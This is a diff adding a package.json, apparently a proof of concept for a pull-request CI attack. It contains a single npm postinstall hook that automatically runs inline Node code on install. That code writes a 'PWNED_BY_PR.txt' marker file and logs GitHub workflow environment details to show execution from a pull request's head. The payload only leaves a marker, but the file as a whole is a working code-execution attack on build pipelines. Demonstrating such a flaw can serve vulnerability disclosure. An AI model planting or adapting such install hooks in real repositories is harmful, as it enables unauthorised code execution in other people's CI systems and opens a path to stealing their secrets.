@@ -1,0 +1,8 @@
+{
+  "name": "gab-custard-poc",
+  "version": "1.0.0",
+  "private": true,
+  "scripts": {
+    "postinstall": "node -e \"const fs=require('fs');fs.writeFileSync('PWNED_BY_PR.txt','postinstall executed event='+process.env.GITHUB_EVENT_NAME+' repo='+process.env.GITHUB_REPOSITORY);console.log('GAB_PWNED: npm postinstall executed from PR head, event='+process.env.GITHUB_EVENT_NAME+' repo='+process.env.GITHUB_REPOSITORY)\""
+  }
+}
